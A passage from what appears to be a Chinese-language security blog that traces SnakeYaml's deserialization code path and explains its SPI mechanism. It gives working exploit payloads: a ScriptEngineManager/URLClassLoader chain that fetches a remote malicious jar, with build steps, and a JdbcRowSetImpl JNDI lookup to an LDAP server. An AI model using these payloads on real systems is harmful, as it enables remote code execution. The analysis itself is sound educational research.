<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> NodeTuple <span class="title function_">representJavaBeanProperty</span><span class="params">(Object javaBean, Property property,</span></span><br><span class="line"><span class="params">                                                  Object propertyValue, Tag customTag)</span> &#123;</span><br><span class="line">        <span class="type">ScalarNode</span> <span class="variable">nodeKey</span> <span class="operator">=</span> (ScalarNode) representData(property.getName());</span><br><span class="line">        <span class="comment">// the first occurrence of the node must keep the tag</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">hasAlias</span> <span class="operator">=</span> <span class="built_in">this</span>.representedObjects.containsKey(propertyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">Node</span> <span class="variable">nodeValue</span> <span class="operator">=</span> representData(propertyValue);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (propertyValue != <span class="literal">null</span> &amp;&amp; !hasAlias) &#123;</span><br><span class="line">            <span class="type">NodeId</span> <span class="variable">nodeId</span> <span class="operator">=</span> nodeValue.getNodeId();</span><br><span class="line">            <span class="keyword">if</span> (customTag == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nodeId == NodeId.scalar) &#123;</span><br><span class="line">                    <span class="comment">//generic Enum requires the full tag</span></span><br><span class="line">                    <span class="keyword">if</span> (property.getType() != java.lang.Enum.class) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (propertyValue <span class="keyword">instanceof</span> Enum&lt;?&gt;) &#123;</span><br><span class="line">                            nodeValue.setTag(Tag.STR);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nodeId == NodeId.mapping) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (property.getType() == propertyValue.getClass()) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (!(propertyValue <span class="keyword">instanceof</span> Map&lt;?, ?&gt;)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!nodeValue.getTag().equals(Tag.SET)) &#123;</span><br><span class="line">                                    nodeValue.setTag(Tag.MAP);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    checkGlobalTag(property, nodeValue, propertyValue);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">NodeTuple</span>(nodeKey, nodeValue);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大致的工作流程就是如上所示，最后我们的键值对会保存到 list 当中</p>
<p>我在这里并没有找到，为什么没有调用作用域为public变量的setter方法，感觉有点乱乱的</p>
<h3 id="LijK3">反序列化</h3>

<p>走进<code>load</code>方法，这里将我们的yaml数据放入一个<code>StreamReader</code>中，并调用<code>loadFromReader</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">load</span><span class="params">(String yaml)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) loadFromReader(<span class="keyword">new</span> <span class="title class_">StreamReader</span>(yaml), Object.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>前面两行代码，主要是从<code>SreamReder</code>流中读取YAML数据，并将其组合成YAML结构</p>
<p>最后<code>constructor.getSingleData(type)</code>才是将YAML数据转化为Java对象的操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">loadFromReader</span><span class="params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">        <span class="type">Composer</span> <span class="variable">composer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Composer</span>(<span class="keyword">new</span> <span class="title class_">ParserImpl</span>(sreader), resolver, loadingConfig);</span><br><span class="line">        constructor.setComposer(composer);</span><br><span class="line">        <span class="keyword">return</span> constructor.getSingleData(type);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>getSingleData</code>后，首先会创建一个Node对象（将字符串按照yaml语法转化为Node对象），然后判断type类型是否为Object，然后判断rootTag是否为空，这里我们都能跳过去，最后走到<code>constructDocument(node)</code>方法内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSingleData</span><span class="params">(Class&lt;?&gt; type)</span> &#123;</span><br><span class="line">        <span class="comment">// Ensure that the stream contains a single document and construct it</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> composer.getSingleNode();</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span> &amp;&amp; !Tag.NULL.equals(node.getTag())) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Object.class != type) &#123;</span><br><span class="line">                node.setTag(<span class="keyword">new</span> <span class="title class_">Tag</span>(type));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rootTag != <span class="literal">null</span>) &#123;</span><br><span class="line">                node.setTag(rootTag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> constructDocument(node);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Construct</span> <span class="variable">construct</span> <span class="operator">=</span> yamlConstructors.get(Tag.NULL);</span><br><span class="line">            <span class="keyword">return</span> construct.construct(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，在Node对象中，保存着我们的参数的各种属性（类型，参数名，value值）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742876145719-8e19efc5-880f-4d63-98bf-db4e39d65683.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742876145719-8e19efc5-880f-4d63-98bf-db4e39d65683.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>constructDocument() </code>方法的最终目的是构建一个完整的 YAML 文件，如果文件是递归结构，再进行二次处理（这里的递归结构其实就是我后面会讲的<code>[!!]</code>这个）。我们这里跟进一下 constructObject() 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">constructDocument</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> constructObject(node);</span><br><span class="line">            fillRecursive();</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (wrappedToRootException &amp;&amp; !(e <span class="keyword">instanceof</span> YAMLException)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//clean up resources</span></span><br><span class="line">            constructedObjects.clear();</span><br><span class="line">            recursiveObjects.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>该方法中，通过<code>containsKey</code>方法来判断是否该节点已经被构造，若已构造，则会返回一个实例化过后的对象；反之，就会用指定的node节点构造对象，并返回对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObject</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (constructedObjects.containsKey(node)) &#123;</span><br><span class="line">            <span class="keyword">return</span> constructedObjects.get(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> constructObjectNoCheck(node);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们的节点并没有被构造过，所以会跳到<code>constructObjectNoCheck</code>方法中</p>
<p>我们可以看到，这里将node节点放进到了<code>recursiveObjects</code>中，然后往下进行了一次判断：constructedObjects是否构造了该节点，如果构造了就用<code>get</code>方法获取到他，若没有构造，就调用<code>construct</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructObjectNoCheck</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (recursiveObjects.contains(node)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;found unconstructable recursive node&quot;</span>,</span><br><span class="line">                    node.getStartMark());</span><br><span class="line">        &#125;</span><br><span class="line">        recursiveObjects.add(node);</span><br><span class="line">        <span class="type">Construct</span> <span class="variable">constructor</span> <span class="operator">=</span> getConstructor(node);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> (constructedObjects.containsKey(node)) ? constructedObjects.get(node)</span><br><span class="line">                : constructor.construct(node);</span><br><span class="line"></span><br><span class="line">        finalizeConstruction(node, data);</span><br><span class="line">        constructedObjects.put(node, data);</span><br><span class="line">        recursiveObjects.remove(node);</span><br><span class="line">        <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">            constructor.construct2ndStep(node, data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>步入<code>construct</code>方法，步入<code>ConstructYamlObject</code>的<code>construct</code>当中，但是这里没有做什么操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">construct</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> getConstructor(node).construct(node);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ConstructorException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;Can&#x27;t construct a java object for &quot;</span></span><br><span class="line">                        + node.getTag() + <span class="string">&quot;; exception=&quot;</span> + e.getMessage(), node.getStartMark(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们先看<code>getConstructor</code>方法中，<code>getClassForNode</code>方法为我们返回了一个Class类，后续setType方法为node设置了一个合适的类构造，后续走入<code>getClassForNode</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Construct <span class="title function_">getConstructor</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cl = getClassForNode(node);</span><br><span class="line">            node.setType(cl);</span><br><span class="line">            <span class="comment">// call the constructor as if the runtime class is defined</span></span><br><span class="line">            <span class="type">Construct</span> <span class="variable">constructor</span> <span class="operator">=</span> yamlClassConstructors.get(node.getNodeId());</span><br><span class="line">            <span class="keyword">return</span> constructor;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在该<code>getClassForNode</code>方法中，他主要是通过反射为我们的node节点选取了一个合适的构造类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; getClassForNode(Node node) &#123;</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; classForTag = typeTags.get(node.getTag());</span><br><span class="line">        <span class="keyword">if</span> (classForTag == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> node.getTag().getClassName();</span><br><span class="line">            Class&lt;?&gt; cl;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cl = getClassForName(name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;Class not found: &quot;</span> + name);</span><br><span class="line">            &#125;</span><br><span class="line">            typeTags.put(node.getTag(), cl);</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> classForTag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>返回我们的构造类后，我们走入<code>construct</code>方法中，这里我们会跳到最后一个else中，将我们的类进行实例化，这里<code>node.isTwoStepsConstruction()</code>默认返回false，所以我们会进入到最后一个else中，将obj放入<code>constructJavaBean2ndStep</code>构造函数中并返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">construct</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">            <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) node;</span><br><span class="line">            <span class="keyword">if</span> (Map.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> newMap(mnode);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> constructMapping(mnode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Collection.class.isAssignableFrom(node.getType())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> newSet(mnode);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> constructSet(mnode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Constructor.<span class="built_in">this</span>.newInstance(mnode);</span><br><span class="line">                <span class="keyword">if</span> (node.isTwoStepsConstruction()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> obj;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> constructJavaBean2ndStep(mnode, obj);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，实例化已经完成</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742903926211-71a44dbc-d8f2-4042-82a3-2218ce8e5dd7.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742903926211-71a44dbc-d8f2-4042-82a3-2218ce8e5dd7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>constructJavaBean2ndStep</code>函数中，该函数会从node中获取key和value的值，并赋值到我们的object参数中，最终返回一个完整的类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742904320541-93abe830-7b44-4064-91ba-b0396303238a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742904320541-93abe830-7b44-4064-91ba-b0396303238a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="BJPOu">奇怪特性的解释</h3>

<p>我们之前说过，如果添加public属性，是不会调用该类的setter或getter方法的</p>
<p>除public属性外的设置值或者获取值时，都是要反射获取他们的setter或者getter方法去完成相关的业务</p>
<p>而经过调试来看，public属性的参数在获取值或者设置值的时候，和其他属性的是有差别的，public属性值的设置与获取，只是简单的反射获取与修改</p>
<p>这里就不做过多分析，如果有想要跟进一下代码的师傅，可以从下面方法去跟进分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//constructJavaBean2ndStep</span></span><br><span class="line">        <span class="keyword">if</span> (memberDescription == <span class="literal">null</span></span><br><span class="line">                            || !memberDescription.setProperty(object, key, value)) &#123;</span><br><span class="line">                        property.set(object, value);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="Up6z3">SnakeYaml 反序列化漏洞之 SPI 链子</h2>
<h3 id="UZsHY">漏洞原理</h3>
我感觉这个漏洞也比较像fastjson的反序列化漏洞

<p>有些区别的是，Fastjson中可以调用<code>getter/setter</code>的面很宽泛，而Snakeyaml只能调用非public，static以及transient作用域的setter方法</p>
<h3 id="rOsYD">利用 SPI 机制 - 基于 ScriptEngineManager 利用链</h3>
<h4 id="gWOCJ">EXP与攻击</h4>
EXP如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPInScriptEngineManager</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;rqwdlmnfqg.lfcx.eu.org\&quot;]]]]\n&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到，也是成功接收到了URLDNS请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742910581855-a7bcbf04-064c-4042-889f-f52cf171be6a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742910581855-a7bcbf04-064c-4042-889f-f52cf171be6a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>该EXP只能进行简单的探测，攻击的话，可以使用<font style="color:rgb(80, 80, 92);">Github上的一个项目</font></p>
<p><font style="color:rgb(80, 80, 92);"> </font><a href="https://github.com/artsploit/yaml-payload/">https://github.com/artsploit/yaml-payload/</a></p>
<p>我们将项目中的命令，改成自己想要的就好</p>
<p>然后使用如下两条命令，将该java文件打包成一个jar包，使用python开启一个http服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>

<p>使用如下payload，就可以用URLClassLoader去加载远程类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://127.0.0.1:8888/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742959338050-405c34f9-73bd-4d4a-a81a-9c76b0b8a26e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742959338050-405c34f9-73bd-4d4a-a81a-9c76b0b8a26e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="SN9oS">SPL机制</h4>
SPL（Service Provider Loader，服务提供者加载）机制是Java中的一种**服务提供发现**机制，用于动态加载和使用服务实现。它主要依赖于` java.util.ServiceLoader`，能够在运行时查找、加载和实例化符合某个接口或抽象类的实现类

<p>那么如果需要使用 SPI 机制则需要在<code>Java classpath</code>下的<code>META-INF/services/</code>目录里创建一个以<strong>服务接口命名的文件</strong>，这个文件里的内容就是这个<strong>接口的具体的实现类</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742960230310-81ce672d-d39e-45bb-9733-dca944b51a9f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742960230310-81ce672d-d39e-45bb-9733-dca944b51a9f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>SPI是一种动态替换发现的机制，比如有个接口，想运行时动态的给它添加实现，你只需要添加一个实现</p>
<p>这里使用JDBC的库 – <strong><font style="color:rgb(80, 80, 92);">mysql-connector-java</font></strong><font style="color:rgb(80, 80, 92);"> </font>来举例子</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到<code>META-INF/services/</code>路径下的文件名就是我们的<strong>服务接口名</strong>，内容就是<strong>接口的具体实现类</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742961202448-0a0cb6c1-f697-4995-b64c-1c04f35f7c60.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742961202448-0a0cb6c1-f697-4995-b64c-1c04f35f7c60.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>而数据库有很多种类型，而实现方式不尽相同，而在实现各种连接驱动的时候，只需要添加java.sql.Driver实现接口，然后 Java 的 SPI 机制可以为某个接口寻找服务实现，就实现了各种数据库的驱动连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(</span><br><span class="line">                <span class="string">&quot;jdbc:mysql://localhost:3306/pikachu&quot;</span>, <span class="string">&quot;pikachu&quot;</span>, <span class="string">&quot;123456&quot;</span></span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">&quot;数据库连接成功：&quot;</span> + (conn != <span class="literal">null</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>工作原理如下：</strong></p>
<ol>
<li><p><code>DriverManager.getConnection()</code> 被调用时，<code>ServiceLoader</code> 通过 <code>META-INF/services/java.sql.Driver</code> 加载注册的驱动类。</p>
</li>
<li><p><code>ServiceLoader</code> 发现 <code>com.mysql.cj.jdbc.Driver</code> 并自动实例化。</p>
</li>
<li><p><code>DriverManager</code> 通过 <code>Driver#connect()</code> 方法建立数据库连接。</p>
</li>
</ol>
<h4 id="D7BC4">漏洞分析</h4>

<p>访问到jar包时，会扫描<code>META-INF/services</code>下的文件，扫到<code>javax.script.ScriptEngineFactory</code>，会创造这个接口的具体实现类，这个具体实现类就是<code>artsploit.AwesomeScriptEngineFactory</code>，也就是我们构造的恶意类。</p>
<h2 id="Vp7T9">SnakeYaml 反序列化漏洞的 Gadgets</h2>
<h3 id="O5hnp">JdbcRowSetImpl</h3>

<p>这条链子也很熟悉了，在<code>JdbcRowSetImpl#connect</code>方法中，存在一个JNDI注入的地方（lookup处）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>getDataSourceName</code>方法返回了dataSource，而我们存在一个dataSource的setter方法，在进行反序列化时，会调用<code>setDataSourceName</code>方法，因此在lookup方法中，<code>this.getDataSourceName()</code>处是可控的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            dataSource = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           dataSource = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        URL = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们就该怎么去触发<code>connect</code>方法</p>
<p>我们找到了<code>setAutoCommit</code>方法，他既可以调用connect，也是一个我们可以调用的setter方法，（参数都为private属性）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">            <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>EXP如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;ldap://127.0.0.1:8085/WRTOPmjx\&quot;, autoCommit: true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="ygBkF">Spring PropertyPathFactoryBean</h3>
依赖导入

